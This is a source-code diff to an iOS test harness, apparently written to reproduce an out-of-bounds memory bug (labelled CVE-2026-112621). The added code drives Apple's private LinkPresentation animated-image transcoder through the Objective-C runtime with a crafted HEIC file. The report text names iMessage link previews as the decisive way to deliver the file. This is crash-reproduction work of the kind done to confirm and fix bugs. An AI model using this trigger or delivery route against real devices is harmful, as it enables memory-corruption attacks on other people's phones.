@@ -2,6 +2,7 @@
 #import <UIKit/UIKit.h>
 #import "KPLog.h"
 #import <objc/message.h>
+#import <objc/runtime.h>
 #import <ImageIO/ImageIO.h>
 #import <UniformTypeIdentifiers/UniformTypeIdentifiers.h>
 
@@ -223,6 +224,97 @@
     return result;
 }
 
+#pragma mark - Direct transcoder (decisive in-app trigger)
+
+// LPMetadataProvider only fetches metadata; the OOB lives in
+// -[LPAnimatedImageTranscoder encodeNextFrame], which Messages drives.
+// Here we drive that class directly through the runtime. If the OOB fires,
+// the fault lands on com.apple.LinkPresentation.AnimatedImageTranscoder and
+// is captured in the device crash log — that IS the CVE-2026-112621 proof.
+- (NSDictionary *)runDirectTranscoderWithHEICPath:(NSString *)path {
+    NSMutableDictionary *result = [NSMutableDictionary dictionary];
+    NSData *data = [NSData dataWithContentsOfFile:path];
+    result[@"heic_bytes"] = @(data.length);
+
+    Class imageClass = NSClassFromString(@"LPImage");
+    Class transcoderClass = NSClassFromString(@"LPAnimatedImageTranscoder");
+    result[@"lp_image_class"] = imageClass ? NSStringFromClass(imageClass) : @"NOT_FOUND";
+    result[@"lp_transcoder_class"] = transcoderClass ? NSStringFromClass(transcoderClass) : @"NOT_FOUND";
+    if (!imageClass || !transcoderClass || !data.length) return result;
+
+    unsigned int imageCount = 0, tcCount = 0;
+    Method *imageMethods = class_copyMethodList(imageClass, &imageCount);
+    Method *tcMethods = class_copyMethodList(transcoderClass, &tcCount);
+    NSMutableArray *imageInits = [NSMutableArray array];
+    NSMutableArray *tcInits = [NSMutableArray array];
+    NSMutableArray *tcAll = [NSMutableArray array];
+    for (unsigned int i = 0; i < imageCount; i++) {
+        NSString *name = NSStringFromSelector(method_getName(imageMethods[i]));
+        if ([name hasPrefix:@"init"]) [imageInits addObject:name];
+    }
+    for (unsigned int i = 0; i < tcCount; i++) {
+        NSString *name = NSStringFromSelector(method_getName(tcMethods[i]));
+        [tcAll addObject:name];
+        if ([name hasPrefix:@"init"]) [tcInits addObject:name];
+    }
+    free(imageMethods);
+    free(tcMethods);
+    result[@"lp_image_inits"] = imageInits;
+    result[@"lp_transcoder_inits"] = tcInits;
+    result[@"lp_transcoder_methods"] = tcAll;
+
+    SEL providerInit = NSSelectorFromString(@"initWithItemProvider:");
+    id lpImage = nil;
+    if ([imageClass instancesRespondToSelector:providerInit]) {
+        NSItemProvider *provider = [[NSItemProvider alloc] initWithItem:(id)data typeIdentifier:@"public.heic"];
+        lpImage = ((id (*)(id, SEL, id))objc_msgSend)([imageClass alloc], providerInit, provider);
+    }
+    result[@"lp_image_created"] = @(lpImage != nil);
+    if (!lpImage) return result;
+
+    for (NSString *initName in @[@"initWithAnimatedImage:", @"initWithImage:", @"initWithData:"]) {
+        SEL sel = NSSelectorFromString(initName);
+        if (![transcoderClass instancesRespondToSelector:sel]) continue;
+        [KPLog.shared appendFormat:@"[lp112621] direct transcoder attempt via %@", initName];
+        result[@"attempted_init"] = initName;
+        id transcoder = nil;
+        @try {
+            id argument = [initName isEqualToString:@"initWithData:"] ? (id)data : lpImage;
+            transcoder = ((id (*)(id, SEL, id))objc_msgSend)([transcoderClass alloc], sel, argument);
+        } @catch (NSException *exception) {
+            result[@"init_exception"] = exception.reason ?: exception.name;
+        }
+        result[@"transcoder_created"] = @(transcoder != nil);
+        if (!transcoder) continue;
+
+        SEL transcodeSel = NSSelectorFromString(@"_transcodeWithCompletionHandler:");
+        if ([transcoder respondsToSelector:transcodeSel]) {
+            dispatch_semaphore_t sema = dispatch_semaphore_create(0);
+            __block NSError *completionError = nil;
+            void (^completion)(NSError *) = ^(NSError *error) {
+                completionError = error;
+                dispatch_semaphore_signal(sema);
+            };
+            [KPLog.shared append:@"[lp112621] BEFORE_DIRECT_TRANSCODE (crash forensics armed)"];
+            ((void (*)(id, SEL, id))objc_msgSend)(transcoder, transcodeSel, completion);
+            long waited = dispatch_semaphore_wait(sema, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(20 * NSEC_PER_SEC)));
+            result[@"transcode_waited_out"] = @(waited != 0);
+            result[@"completion_error"] = completionError.localizedDescription ?: @"none";
+            [KPLog.shared append:@"[lp112621] AFTER_DIRECT_TRANSCODE survived"];
+        } else {
+            SEL encodeSel = NSSelectorFromString(@"encodeNextFrame");
+            if ([transcoder respondsToSelector:encodeSel]) {
+                [KPLog.shared append:@"[lp112621] BEFORE_ENCODE_NEXT_FRAME (crash forensics armed)"];
+                ((void (*)(id, SEL))objc_msgSend)(transcoder, encodeSel);
+                result[@"encode_next_frame_called"] = @YES;
+                [KPLog.shared append:@"[lp112621] AFTER_ENCODE_NEXT_FRAME survived"];
+            }
+        }
+        break;
+    }
+    return result;
+}
+
 #pragma mark - Report
 
 - (NSString *)runReport {
@@ -265,17 +357,23 @@
     [report appendFormat:@"page_route: %@\n", pageRoute];
     [report appendString:@"AFTER_PAGE_ROUTE survived.\n"];
 
+    [report appendString:@"--- direct LPAnimatedImageTranscoder ---\n"];
+    NSDictionary *direct = [self runDirectTranscoderWithHEICPath:path];
+    [report appendFormat:@"direct_transcoder: %@\n", direct];
+    [report appendString:@"AFTER_DIRECT_TRANSCODER survived.\n"];
+
     [report appendString:@"\nVERDICT: "];
     if (self.armed) {
         [report appendString:@"SURVIVED\n"];
         [report appendString:
-         @"Interpretation: LPMetadataProvider completed without faulting this process.\n"
-         @"This does NOT close CVE-2026-112621: the original crash was on the\n"
-         @"com.apple.LinkPresentation.AnimatedImageTranscoder queue and was reliably\n"
-         @"reproduced through Messages link previews; image-route metadata can return\n"
-         @"without invoking encodeNextFrame on every OS build.\n"
-         @"Next: send the HEIC via an iMessage link preview (og:image over HTTPS) and\n"
-         @"watch for EXC_BAD_ACCESS in __bzero/CGContextClearRect on the transcoder queue.\n"];
+         @"Interpretation: LPMetadataProvider and the direct transcoder attempt\n"
+         @"completed without faulting THIS process. If LPAnimatedImageTranscoder\n"
+         @"was actually created (transcoder_created=1) and transcoding ran, a\n"
+         @"survive is meaningful; if the class/initializers were not reachable,\n"
+         @"the trigger never fired and this says nothing about the CVE.\n"
+         @"On a fault the app dies on com.apple.LinkPresentation.AnimatedImage-\n"
+         @"Transcoder with __bzero/CGContextClearRect in the log — that is the\n"
+         @"proof (cf. Appknox F-21). Decisive alternative: iMessage link preview.\n"];
     } else {
         [report appendString:@"SURVIVED (expected — equal-height control)\n"];
         [report appendString:@"Control frame counts and decoded sizes must match the oracle above.\n"];
